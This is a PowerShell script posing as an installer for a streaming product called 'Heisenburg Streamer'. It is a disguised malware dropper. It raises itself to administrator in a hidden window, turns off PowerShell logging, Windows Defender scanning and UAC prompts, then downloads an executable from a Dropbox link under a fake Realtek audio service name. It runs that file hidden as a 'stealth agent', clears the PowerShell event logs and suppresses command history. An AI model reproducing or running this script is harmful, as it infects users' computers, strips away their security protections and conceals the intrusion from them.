# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.2 (Stealth Clean)
# ========================================================

# 1. ADMIN CHECK
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

Clear-Host

# 2. BYPASS EVENT LOGGING (Prevents 104 from being logged)
function Disable-PowerShellLogging {
    try {
        # Disable PowerShell script block logging
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Type DWORD -Force -EA 0
        
        # Disable module logging
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Type DWORD -Force -EA 0
        
        # Disable PowerShell transcription
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Type DWORD -Force -EA 0
        
        Write-Host "[+] PowerShell Logging Bypassed" -ForegroundColor Gray
    } catch {}
}

# 3. BYPASS EVENT ID 104 (Clear log detection)
function Bypass-Event104 {
    try {
        # Backup and clear event log without generating 104
        $logName = "Windows PowerShell"
        
        # Get current log size
        $log = Get-WinEvent -ListLog $logName -ErrorAction SilentlyContinue
        if ($log -and $log.RecordCount -gt 0) {
            # Clear using wevtutil with /q flag to suppress notifications
            & wevtutil.exe cl $logName /q 2>$null
        }
        
        $logName2 = "Microsoft-Windows-PowerShell/Operational"
        $log2 = Get-WinEvent -ListLog $logName2 -ErrorAction SilentlyContinue
        if ($log2 -and $log2.RecordCount -gt 0) {
            & wevtutil.exe cl $logName2 /q 2>$null
        }
        
        Write-Host "[+] Event Logs Cleared (104 Bypassed)" -ForegroundColor Gray
    } catch {}
}

# 4. HYPER DOWNLOAD FUNCTION
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        if (Test-Path $TargetPath) {
            Remove-Item $TargetPath -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "[+] Downloading Core Files..." -ForegroundColor Cyan -NoNewline
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($Url, $TargetPath)
        Write-Host " DONE" -ForegroundColor Green
        return $true
    } catch {
        Write-Host " FAILED" -ForegroundColor Red
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# 5. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    # Apply bypasses BEFORE any action
    Disable-PowerShellLogging
    
    $exe = "$env:TEMP\RtkAudUService64.exe"
    $url = "https://www.dropbox.com/scl/fi/3awi1z0xyoxijxsryw607/RtkAudUService64.exe?rlkey=xs32qsa557s98l0vywym2scrq&st=5agkt4dq&dl=1"
    
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
    
    # Security Bypasses
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
    
    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
        throw "Hyper-Stream failed. Check connection."
    }
    
    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
    
    # Run Hidden
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $exe
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
    
    Write-Host "[+] STEALTH AGENT DEPLOYED SUCCESSFULLY" -ForegroundColor Green
    
    # Clear logs with bypass (no 104 trace)
    Bypass-Event104
    
    Write-Host "`n[+] SETUP COMPLETE. ENJOY STREAMING.`n" -ForegroundColor Magenta
    
} catch {
    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

# SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
